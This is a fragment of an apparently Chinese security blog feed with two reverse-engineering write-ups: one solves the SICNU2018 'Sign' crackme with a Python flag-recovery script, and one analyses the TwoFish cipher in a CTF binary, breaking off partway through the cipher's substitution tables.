    <content type="html"><![CDATA[<h1 id="SICNU2018-CTF逆向-Sign"><a href="#SICNU2018-CTF逆向-Sign" class="headerlink" title="SICNU2018-CTF逆向 Sign"></a>SICNU2018-CTF逆向 Sign</h1><p>2018年五月川师的比赛题，一直放着没有看，今天清理文件拿出来看一下</p><p>x86,入口jmp一看就是VS编译，无壳无花</p><p>之前一直好奇大佬们是怎样做到秒题的，做完这道才题知道，只有敏锐的洞察力快速定位核心代码才是王道</p><p>main函数<br><img src="https://i.loli.net/2019/07/26/5d3a7c867363016763.jpg" alt></p><p>很显然有两个判断点<br>第一个直接看赋值v5的函数sub_401186，这道题有意思的点在于每个函数都会有一个二次跳转，因此如果不能及时定位到关键点，在限定的时间内很难分析出来<br><img src="https://i.loli.net/2019/07/26/5d3a7d54bc1be16220.jpg" alt><br>非常无用的跳转，一直想拿IDC脚本剔除，但可惜没什么思路<br>进入之后<br><img src="https://i.loli.net/2019/07/26/5d3a7d9d8e6f428329.jpg" alt></p><p>v8限定字符串长度，开头必须是 ‘SICNU{’  ,算上最后一个一定是‘}’，因此我们还要输入16个字符。<br>动态调试发现下面的判断也只判断了输入前6个字符，然后截断，并没有做其他操作</p><p>回到主函数看到第二个判定在v3，直接进入<br><img src="https://i.loli.net/2019/07/26/5d3a7ecb6d76846189.jpg" alt><br><img src="https://i.loli.net/2019/07/26/5d3a7ee02379c25978.jpg" alt></p><p>如图，动态调试发现，v1是对{后的输入每次取一字符，然后和key1密钥表异或，共操作六次<br>v2是剩余字符长度，其中除去反括号还有10个字符，这里sub_401230的功能F5识别出错，直接看汇编<br><img src="https://i.loli.net/2019/07/26/5d3a7ffddfe4436075.jpg" alt><br>rep stosd循环，ecx,11h为循环次数，eax初始0CCCCCCCCh，最后v2为固定值11</p><p>接下来判断是否是数字，是则+17，不是则与key2密钥表异或</p><p>接下来验证答案，要求C1等于key3-v20，C2等于key4-v13，所以写脚本直接反求即可</p><p>python脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a0 = [<span class="number">0xE5</span>, <span class="number">0xA6</span>, <span class="number">0xE4</span>, <span class="number">0xE2</span>, <span class="number">0xD4</span>, <span class="number">0x95</span>, <span class="number">0xEC</span>]</span><br><span class="line">a1 = [ <span class="number">0xFC</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0xC7</span>, <span class="number">0x66</span>, <span class="number">0x42</span>, <span class="number">0x5D</span>, <span class="number">0x68</span>, <span class="number">0x28</span>, <span class="number">0x3B</span>]</span><br><span class="line">key1 = [<span class="number">0xB2</span>, <span class="number">0xC3</span>, <span class="number">0xD5</span>, <span class="number">0xA1</span>, <span class="number">0xE4</span>, <span class="number">0xF8</span>, <span class="number">0xA9</span>]</span><br><span class="line">key2 = [<span class="number">0xA3</span>, <span class="number">0x45</span>, <span class="number">0xEA</span>, <span class="number">0x35</span>, <span class="number">0x3E</span>, <span class="number">0x26</span>, <span class="number">0x5D</span>, <span class="number">0x46</span>]</span><br><span class="line"></span><br><span class="line">C1 = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">C1[i]=chr(key1[i]^a0[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">"flag:    SICNU&#123;"</span>, end = <span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">print(C1[a], end = <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line">C2 = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">C2[i] = a1[j] - <span class="number">17</span></span><br><span class="line"><span class="keyword">if</span>(C2[i]&gt;=<span class="number">48</span> <span class="keyword">and</span> C2[i]&lt;=<span class="number">57</span>):</span><br><span class="line">C2[i] = chr(C2[i])</span><br><span class="line">i=i+<span class="number">1</span></span><br><span class="line">j=j+<span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">C2[i] = chr(key2[k] ^ a1[j])</span><br><span class="line">i=i+<span class="number">1</span></span><br><span class="line">j=j+<span class="number">1</span></span><br><span class="line">k=k+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">print(C2[a], end = <span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>flag<br><img src="https://i.loli.net/2019/07/26/5d3a8138d970b13890.jpg" alt></p><p>From <a href="https://kabeor.github.io/SICNU-CTF逆向 Sign/">https://kabeor.github.io/SICNU-CTF逆向 Sign/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SICNU2018-CTF逆向-Sign&quot;&gt;&lt;a href=&quot;#SICNU2018-CTF逆向-Sign&quot; class=&quot;headerlink&quot; title=&quot;SICNU2018-CTF逆向 Sign&quot;&gt;&lt;/a&gt;SICNU2018-CTF逆向 Sign&lt;/h1&gt;&lt;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向， CTF" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C-CTF/"/>
    
  </entry>
  
  <entry>
    <title>逆向分析加解密之TwoFish算法</title>
    <link href="https://kabeor.github.io/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%B9%8BTwoFish%E7%AE%97%E6%B3%95/"/>
    <id>https://kabeor.github.io/逆向分析加解密之TwoFish算法/</id>
    <published>2019-07-25T04:02:55.808Z</published>
    <updated>2019-08-02T07:09:58.632Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向分析加解密之TwoFish算法"><a href="#逆向分析加解密之TwoFish算法" class="headerlink" title="逆向分析加解密之TwoFish算法"></a>逆向分析加解密之TwoFish算法</h1><blockquote><p>本文由本人首发于先知社区 <a href="https://xz.aliyun.com/t/5807" target="_blank" rel="noopener">https://xz.aliyun.com/t/5807</a></p></blockquote><p>前几天某师傅给我发来一个逆向题，拿来分析发现竟是AES决赛算法之一的TwoFish算法，之前网上对此算法的逆向分析竟然一个都没有，对算法的介绍也只有寥寥数语，于是想准备在这里与大家分享对该算法的逆向分析以及CTF中此算法的变体。</p><h2 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h2><p>官方有一个68页的pdf，有兴趣可以看一下<br><a href="http://www.schneier.com/twofish-analysis-shiho.pdf" target="_blank" rel="noopener">http://www.schneier.com/twofish-analysis-shiho.pdf</a></p><h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p><img src="https://i.loli.net/2019/07/25/5d391b311e84491804.jpg" alt></p><p>TwoFish的意思应该就是这样交叉运算的形状吧</p><h3 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h3><p>TwoFish加密需要明文(plain)和密钥(key)<br>总的来说进行一次加解密可分为三个环节</p><ol><li>Input whitening</li><li>16次循环</li><li>Output whitening</li></ol><h4 id="Input-whitening"><a href="#Input-whitening" class="headerlink" title="Input whitening"></a>Input whitening</h4><blockquote><ol><li>拓展密钥</li></ol></blockquote><p>在Twofish 算法中，规定密钥的长度 N = 128, N = 192, N = 256三种。也就是说密钥的长度可以在128-bit ~ 256-bit之间变化。</p><p>我们需要产生40个与密钥相关的K(i)，这里的K(i)是根据密钥算出来的32-bit数据<br>除此以外，我们还需要4个与密钥相关的S-box，也就是s(i)()。</p><p>为计算K和S，定义MDS矩阵</p><p><img src="https://i.loli.net/2019/07/25/5d392304b308519968.jpg" alt> </p><p>且对于MDS 矩阵，有限域GF的定义如下：<br><code>GF(2^8) ≡ GF(2)(x)/v(x)，其中v(x) = x^8 + x^6 + x^5 + x^3 + 1</code>   </p><p>此外还需要h函数</p><pre><code> y(k,j) = x(j)                     j = 0, ... ,3如果：k == 4    y(3,0) = q1[y(4,0)] xor l(3,0)    y(3,1) = q0[y(4,1)] xor l(3,1)    y(3,2) = q0[y(4,2)] xor l(3,2)    y(3,3) = q1[y(4,3)] xor l(3,3)如果：k &gt;= 3    y(2,0) = q1[y(3,0)] xor l(2,0)    y(2,1) = q1[y(3,1)] xor l(2,1)    y(2,2) = q0[y(3,2)] xor l(2,2)    y(2,3) = q0[y(3,3)] xor l(3,3)对于所有情况：    y0 = q1[q0[q0[y(2,0)] xor l(1,0)] xor l(0,0)]    y1 = q0[q0[q1[y(2,1)] xor l(1,1)] xor l(0,1)]    y2 = q1[q1[q0[y(2,2)] xor l(1,2)] xor l(0,2)]    y3 = q0[q1[q1[y(2,3)] xor l(1,3)] xor l(0,3)]</code></pre><p>实现代码稍后来说</p><blockquote><ol><li>输入白化</li></ol></blockquote><p>因为加密前的plain text是128 bits，也就是16 bytes。假设这16 bytes分别是p0, … ,p15。将p0, … ,p15分为4组：<br><code>P(i) = ∑p(4i+j)2^(8j)，其中i,j = 0, ... ,3</code></p><p>然后进行运算<code>R(0,i) = P(i) xor K(i)，其中i = 0, ... ,3</code></p><h4 id="16次运算"><a href="#16次运算" class="headerlink" title="16次运算"></a>16次运算</h4><p>将以下公式循环16次</p><pre><code>(F(r,0), F(r,1)) = F(R(r,0), R(r,1), r) R(r+1,0) = ROR(R(r,2) xor F(r,0), 1) R(r+1,1) = ROL(R(r,3), 1) xor F(r,1) R(r+1,2) = R(r,0) R(r+1,3) = R(r,1)</code></pre><p>其中，F函数为以下操作</p><pre><code>t0 = g(r0)t1 = rol(r1, 8)t1 = g(t1)o = 2*rF0 = (T0 +  T1 + K(2r+8)) mod 2^32F1 = (T0 + 2T1 + K(2r+9)) mod 2^32</code></pre><p>其中g函数为核心函数</p><pre><code>x(i) = [X/2^(8i)] mod 2^8  其中i = 0, ... ,3y(i) = s(i)(x(i))       其中i = 0, ... ,3</code></pre><p><img src="https://i.loli.net/2019/07/25/5d392756d7d6492028.jpg" alt> </p><pre><code>Z = ∑z(i)2^(8i)，其中i = 0, ... ,3</code></pre><h4 id="输出白化"><a href="#输出白化" class="headerlink" title="输出白化"></a>输出白化</h4><pre><code>C(i) = R(16,(i+2) mod 4) xor K(i+4)，其中i = 0, ... ,3</code></pre><p>最后计算组成密文</p><pre><code>c(i) = [C(i/4) / 2^(8(i mod 4))] mod 2^8，其中i = 0, ... ,15</code></pre><p>下面来逆向分析看一下实际实现吧</p><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>拿到题后PEID分析<br><img src="https://i.loli.net/2019/07/25/5d392ac4cd3a266075.jpg" alt><br>分析到了TwoFish算法</p><p>IDA分析一下，进入主函数看到流程<br><img src="https://i.loli.net/2019/07/25/5d392b24602bc32573.jpg" alt><br><img src="https://i.loli.net/2019/07/25/5d392b4b3d71797118.jpg" alt></p><p>发现有五个选项，选项名字在sub_402FDA中</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_402FDA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to jiami jiemi game go.go.go."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1._jiemi_(admin only)"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2._jiami_"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3._jiemi__flag(admin only)"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4.exit"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"5._yanzheng__"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只有选项2和5可用，即加密和验证flag</p><p>进入验证函数sub_40302B查看<br><img src="https://i.loli.net/2019/07/25/5d392c3cbd53454896.jpg" alt></p><p>这里我已经注释出密文和key，因此我们只需要解密即可，但只用标准解密算法就可以吗？我们来验证一下</p><p>很明显加密函数为sub_402E5D(&amp;key, plain, &amp;v3);  参数v3传出密钥<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_BYTE *__<span class="function">cdecl <span class="title">sub_402E5D</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v3; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v3 = sub_401570(a1, <span class="number">128u</span>);                    <span class="comment">// a1 = key   密钥生成k和s</span></span><br><span class="line">  sub_401626(v3, a2, a3);                          <span class="comment">//输入白化，循环，输出白化</span></span><br><span class="line">  <span class="keyword">return</span> sub_401626(v3, (a2 + <span class="number">16</span>), a3 + <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>下面来结合标准实现分析<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401570</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v2; <span class="comment">// ST1C_4</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST14_4</span></span><br><span class="line"></span><br><span class="line">  v2 = sub_402D53(a1, a2 &gt;&gt; <span class="number">3</span>);                 <span class="comment">// key_t* tf_key = expand_key(s, len/8);  拓展密钥</span></span><br><span class="line">  v3 = sub_4025C6(v2);                          <span class="comment">// subkey_t *tf_subkey = Twofish_generate_subkey(tf_key);  生成密钥</span></span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">4260u</span>);</span><br><span class="line">  v5 = sub_401B7A(v4, v3, <span class="number">0x1010101</span>, *v2 &gt;&gt; <span class="number">3</span>); <span class="comment">// tf_twofish = Twofish_generate_ext_k_keys(tf_twofish,tf_subkey,0x01010101,(tf_key-&gt;len/8));  生成k</span></span><br><span class="line">  v6 = sub_401CF8(v5, v3, *v2 &gt;&gt; <span class="number">3</span>);            <span class="comment">// tf_twofish = Twofish_generate_ext_s_keys(tf_twofish,tf_subkey,(tf_key-&gt;len/8));  生成s</span></span><br><span class="line">  <span class="built_in">free</span>(v2[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">free</span>(v2);</span><br><span class="line">  <span class="built_in">free</span>(v3);</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>拓展密钥</p></blockquote><p><img src="https://i.loli.net/2019/07/25/5d3930a1cc7b017798.jpg" alt><br>可以看到题中对位数分析的判定进行了修改</p><blockquote><p>生成密钥</p></blockquote><p><img src="https://i.loli.net/2019/07/25/5d39312bb0d7d18656.jpg" alt><br>c实现<img src="https://i.loli.net/2019/07/25/5d3931a257bc836488.jpg" alt></p><p>rsm函数定义为</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rsm(i,a,b,c,d,e,f,g,h)  \</span></span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>),a,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">1</span>),b,<span class="number">0x14d</span>)^\</span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">2</span>),c,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">3</span>),d,<span class="number">0x14d</span>)^\</span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">4</span>),e,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">5</span>),f,<span class="number">0x14d</span>)^\</span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">6</span>),g,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">7</span>),h,<span class="number">0x14d</span>)</span><br></pre></td></tr></table></figure><blockquote><p>k生成</p></blockquote><p><img src="https://i.loli.net/2019/07/25/5d3931f15177364722.jpg" alt><br>h函数内部，可以看出，IDA将二维数组直接一维化<br><img src="https://i.loli.net/2019/07/25/5d39322bb987d21871.jpg" alt></p><p>q0,q1都是256大小的数组<br><img src="https://i.loli.net/2019/07/25/5d3932450ddac91007.jpg" alt><br>标准<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> q[<span class="number">2</span>][<span class="number">256</span>] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* q0 */</span></span><br><span class="line">    &#123;<span class="number">0xa9</span>,<span class="number">0x67</span>,<span class="number">0xb3</span>,<span class="number">0xe8</span>,<span class="number">0x4</span>,<span class="number">0xfd</span>,<span class="number">0xa3</span>,<span class="number">0x76</span>,<span class="number">0x9a</span>,<span class="number">0x92</span>,<span class="number">0x80</span>,<span class="number">0x78</span>,<span class="number">0xe4</span>,<span class="number">0xdd</span>,<span class="number">0xd1</span>,<span class="number">0x38</span>,</span><br><span class="line"><span class="number">0xd</span>,<span class="number">0xc6</span>,<span class="number">0x35</span>,<span class="number">0x98</span>,<span class="number">0x18</span>,<span class="number">0xf7</span>,<span class="number">0xec</span>,<span class="number">0x6c</span>,<span class="number">0x43</span>,<span class="number">0x75</span>,<span class="number">0x37</span>,<span class="number">0x26</span>,<span class="number">0xfa</span>,<span class="number">0x13</span>,<span class="number">0x94</span>,<span class="number">0x48</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0xd0</span>,<span class="number">0x8b</span>,<span class="number">0x30</span>,<span class="number">0x84</span>,<span class="number">0x54</span>,<span class="number">0xdf</span>,<span class="number">0x23</span>,<span class="number">0x19</span>,<span class="number">0x5b</span>,<span class="number">0x3d</span>,<span class="number">0x59</span>,<span class="number">0xf3</span>,<span class="number">0xae</span>,<span class="number">0xa2</span>,<span class="number">0x82</span>,</span><br><span class="line"><span class="number">0x63</span>,<span class="number">0x1</span>,<span class="number">0x83</span>,<span class="number">0x2e</span>,<span class="number">0xd9</span>,<span class="number">0x51</span>,<span class="number">0x9b</span>,<span class="number">0x7c</span>,<span class="number">0xa6</span>,<span class="number">0xeb</span>,<span class="number">0xa5</span>,<span class="number">0xbe</span>,<span class="number">0x16</span>,<span class="number">0xc</span>,<span class="number">0xe3</span>,<span class="number">0x61</span>,</span><br><span class="line"><span class="number">0xc0</span>,<span class="number">0x8c</span>,<span class="number">0x3a</span>,<span class="number">0xf5</span>,<span class="number">0x73</span>,<span class="number">0x2c</span>,<span class="number">0x25</span>,<span class="number">0xb</span>,<span class="number">0xbb</span>,<span class="number">0x4e</span>,<span class="number">0x89</span>,<span class="number">0x6b</span>,<span class="number">0x53</span>,<span class="number">0x6a</span>,<span class="number">0xb4</span>,<span class="number">0xf1</span>,</span><br><span class="line"><span class="number">0xe1</span>,<span class="number">0xe6</span>,<span class="number">0xbd</span>,<span class="number">0x45</span>,<span class="number">0xe2</span>,<span class="number">0xf4</span>,<span class="number">0xb6</span>,<span class="number">0x66</span>,<span class="number">0xcc</span>,<span class="number">0x95</span>,<span class="number">0x3</span>,<span class="number">0x56</span>,<span class="number">0xd4</span>,<span class="number">0x1c</span>,<span class="number">0x1e</span>,<span class="number">0xd7</span>,</span><br><span class="line"><span class="number">0xfb</span>,<span class="number">0xc3</span>,<span class="number">0x8e</span>,<span class="number">0xb5</span>,<span class="number">0xe9</span>,<span class="number">0xcf</span>,<span class="number">0xbf</span>,<span class="number">0xba</span>,<span class="number">0xea</span>,<span class="number">0x77</span>,<span class="number">0x39</span>,<span class="number">0xaf</span>,<span class="number">0x33</span>,<span class="number">0xc9</span>,<span class="number">0x62</span>,<span class="number">0x71</span>,</span><br><span class="line"><span class="number">0x81</span>,<span class="number">0x79</span>,<span class="number">0x9</span>,<span class="number">0xad</span>,<span class="number">0x24</span>,<span class="number">0xcd</span>,<span class="number">0xf9</span>,<span class="number">0xd8</span>,<span class="number">0xe5</span>,<span class="number">0xc5</span>,<span class="number">0xb9</span>,<span class="number">0x4d</span>,<span class="number">0x44</span>,<span class="number">0x8</span>,<span class="number">0x86</span>,<span class="number">0xe7</span>,</span><br><span class="line"><span class="number">0xa1</span>,<span class="number">0x1d</span>,<span class="number">0xaa</span>,<span class="number">0xed</span>,<span class="number">0x6</span>,<span class="number">0x70</span>,<span class="number">0xb2</span>,<span class="number">0xd2</span>,<span class="number">0x41</span>,<span class="number">0x7b</span>,<span class="number">0xa0</span>,<span class="number">0x11</span>,<span class="number">0x31</span>,<span class="number">0xc2</span>,<span class="number">0x27</span>,<span class="number">0x90</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0xf6</span>,<span class="number">0x60</span>,<span class="number">0xff</span>,<span class="number">0x96</span>,<span class="number">0x5c</span>,<span class="number">0xb1</span>,<span class="number">0xab</span>,<span class="number">0x9e</span>,<span class="number">0x9c</span>,<span class="number">0x52</span>,<span class="number">0x1b</span>,<span class="number">0x5f</span>,<span class="number">0x93</span>,<span class="number">0xa</span>,<span class="number">0xef</span>,</span><br><span class="line"><span class="number">0x91</span>,<span class="number">0x85</span>,<span class="number">0x49</span>,<span class="number">0xee</span>,<span class="number">0x2d</span>,<span class="number">0x4f</span>,<span class="number">0x8f</span>,<span class="number">0x3b</span>,<span class="number">0x47</span>,<span class="number">0x87</span>,<span class="number">0x6d</span>,<span class="number">0x46</span>,<span class="number">0xd6</span>,<span class="number">0x3e</span>,<span class="number">0x69</span>,<span class="number">0x64</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0xce</span>,<span class="number">0xcb</span>,<span class="number">0x2f</span>,<span class="number">0xfc</span>,<span class="number">0x97</span>,<span class="number">0x5</span>,<span class="number">0x7a</span>,<span class="number">0xac</span>,<span class="number">0x7f</span>,<span class="number">0xd5</span>,<span class="number">0x1a</span>,<span class="number">0x4b</span>,<span class="number">0xe</span>,<span class="number">0xa7</span>,<span class="number">0x5a</span>,</span><br><span class="line"><span class="number">0x28</span>,<span class="number">0x14</span>,<span class="number">0x3f</span>,<span class="number">0x29</span>,<span class="number">0x88</span>,<span class="number">0x3c</span>,<span class="number">0x4c</span>,<span class="number">0x2</span>,<span class="number">0xb8</span>,<span class="number">0xda</span>,<span class="number">0xb0</span>,<span class="number">0x17</span>,<span class="number">0x55</span>,<span class="number">0x1f</span>,<span class="number">0x8a</span>,<span class="number">0x7d</span>,</span><br><span class="line"><span class="number">0x57</span>,<span class="number">0xc7</span>,<span class="number">0x8d</span>,<span class="number">0x74</span>,<span class="number">0xb7</span>,<span class="number">0xc4</span>,<span class="number">0x9f</span>,<span class="number">0x72</span>,<span class="number">0x7e</span>,<span class="number">0x15</span>,<span class="number">0x22</span>,<span class="number">0x12</span>,<span class="number">0x58</span>,<span class="number">0x7</span>,<span class="number">0x99</span>,<span class="number">0x34</span>,</span><br><span class="line"><span class="number">0x6e</span>,<span class="number">0x50</span>,<span class="number">0xde</span>,<span class="number">0x68</span>,<span class="number">0x65</span>,<span class="number">0xbc</span>,<span class="number">0xdb</span>,<span class="number">0xf8</span>,<span class="number">0xc8</span>,<span class="number">0xa8</span>,<span class="number">0x2b</span>,<span class="number">0x40</span>,<span class="number">0xdc</span>,<span class="number">0xfe</span>,<span class="number">0x32</span>,<span class="number">0xa4</span>,</span><br><span class="line"><span class="number">0xca</span>,<span class="number">0x10</span>,<span class="number">0x21</span>,<span class="number">0xf0</span>,<span class="number">0xd3</span>,<span class="number">0x5d</span>,<span class="number">0xf</span>,<span class="number">0x0</span>,<span class="number">0x6f</span>,<span class="number">0x9d</span>,<span class="number">0x36</span>,<span class="number">0x42</span>,<span class="number">0x4a</span>,<span class="number">0x5e</span>,<span class="number">0xc1</span>,<span class="number">0xe0</span></span><br><span class="line">&#125;,</span><br><span class="line">    <span class="comment">/* q1 */</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="number">0x75</span>,<span class="number">0xf3</span>,<span class="number">0xc6</span>,<span class="number">0xf4</span>,<span class="number">0xdb</span>,<span class="number">0x7b</span>,<span class="number">0xfb</span>,<span class="number">0xc8</span>,<span class="number">0x4a</span>,<span class="number">0xd3</span>,<span class="number">0xe6</span>,<span class="number">0x6b</span>,<span class="number">0x45</span>,<span class="number">0x7d</span>,<span class="number">0xe8</span>,<span class="number">0x4b</span>,</span><br><span class="line"><span class="number">0xd6</span>,<span class="number">0x32</span>,<span class="number">0xd8</span>,<span class="number">0xfd</span>,<span class="number">0x37</span>,<span class="number">0x71</span>,<span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x30</span>,<span class="number">0xf</span>,<span class="number">0xf8</span>,<span class="number">0x1b</span>,<span class="number">0x87</span>,<span class="number">0xfa</span>,<span class="number">0x6</span>,<span class="number">0x3f</span>,</span><br><span class="line"><span class="number">0x5e</span>,<span class="number">0xba</span>,<span class="number">0xae</span>,<span class="number">0x5b</span>,<span class="number">0x8a</span>,<span class="number">0x0</span>,<span class="number">0xbc</span>,<span class="number">0x9d</span>,<span class="number">0x6d</span>,<span class="number">0xc1</span>,<span class="number">0xb1</span>,<span class="number">0xe</span>,<span class="number">0x80</span>,<span class="number">0x5d</span>,<span class="number">0xd2</span>,<span class="number">0xd5</span>,</span><br><span class="line"><span class="number">0xa0</span>,<span class="number">0x84</span>,<span class="number">0x7</span>,<span class="number">0x14</span>,<span class="number">0xb5</span>,<span class="number">0x90</span>,<span class="number">0x2c</span>,<span class="number">0xa3</span>,<span class="number">0xb2</span>,<span class="number">0x73</span>,<span class="number">0x4c</span>,<span class="number">0x54</span>,<span class="number">0x92</span>,<span class="number">0x74</span>,<span class="number">0x36</span>,<span class="number">0x51</span>,</span><br><span class="line"><span class="number">0x38</span>,<span class="number">0xb0</span>,<span class="number">0xbd</span>,<span class="number">0x5a</span>,<span class="number">0xfc</span>,<span class="number">0x60</span>,<span class="number">0x62</span>,<span class="number">0x96</span>,<span class="number">0x6c</span>,<span class="number">0x42</span>,<span class="number">0xf7</span>,<span class="number">0x10</span>,<span class="number">0x7c</span>,<span class="number">0x28</span>,<span class="number">0x27</span>,<span class="number">0x8c</span>,</span><br><span class="line"><span class="number">0x13</span>,<span class="number">0x95</span>,<span class="number">0x9c</span>,<span class="number">0xc7</span>,<span class="number">0x24</span>,<span class="number">0x46</span>,<span class="number">0x3b</span>,<span class="number">0x70</span>,<span class="number">0xca</span>,<span class="number">0xe3</span>,<span class="number">0x85</span>,<span class="number">0xcb</span>,<span class="number">0x11</span>,<span class="number">0xd0</span>,<span class="number">0x93</span>,<span class="number">0xb8</span>,</span><br><span class="line"><span class="number">0xa6</span>,<span class="number">0x83</span>,<span class="number">0x20</span>,<span class="number">0xff</span>,<span class="number">0x9f</span>,<span class="number">0x77</span>,<span class="number">0xc3</span>,<span class="number">0xcc</span>,<span class="number">0x3</span>,<span class="number">0x6f</span>,<span class="number">0x8</span>,<span class="number">0xbf</span>,<span class="number">0x40</span>,<span class="number">0xe7</span>,<span class="number">0x2b</span>,<span class="number">0xe2</span>,</span><br><span class="line"><span class="number">0x79</span>,<span class="number">0xc</span>,<span class="number">0xaa</span>,<span class="number">0x82</span>,<span class="number">0x41</span>,<span class="number">0x3a</span>,<span class="number">0xea</span>,<span class="number">0xb9</span>,<span class="number">0xe4</span>,<span class="number">0x9a</span>,<span class="number">0xa4</span>,<span class="number">0x97</span>,<span class="number">0x7e</span>,<span class="number">0xda</span>,<span class="number">0x7a</span>,<span class="number">0x17</span>,</span><br><span class="line"><span class="number">0x66</span>,<span class="number">0x94</span>,<span class="number">0xa1</span>,<span class="number">0x1d</span>,<span class="number">0x3d</span>,<span class="number">0xf0</span>,<span class="number">0xde</span>,<span class="number">0xb3</span>,<span class="number">0xb</span>,<span class="number">0x72</span>,<span class="number">0xa7</span>,<span class="number">0x1c</span>,<span class="number">0xef</span>,<span class="number">0xd1</span>,<span class="number">0x53</span>,<span class="number">0x3e</span>,</span><br><span class="line"><span class="number">0x8f</span>,<span class="number">0x33</span>,<span class="number">0x26</span>,<span class="number">0x5f</span>,<span class="number">0xec</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0x49</span>,<span class="number">0x81</span>,<span class="number">0x88</span>,<span class="number">0xee</span>,<span class="number">0x21</span>,<span class="number">0xc4</span>,<span class="number">0x1a</span>,<span class="number">0xeb</span>,<span class="number">0xd9</span>,</span><br><span class="line"><span class="number">0xc5</span>,<span class="number">0x39</span>,<span class="number">0x99</span>,<span class="number">0xcd</span>,<span class="number">0xad</span>,<span class="number">0x31</span>,<span class="number">0x8b</span>,<span class="number">0x1</span>,<span class="number">0x18</span>,<span class="number">0x23</span>,<span class="number">0xdd</span>,<span class="number">0x1f</span>,<span class="number">0x4e</span>,<span class="number">0x2d</span>,<span 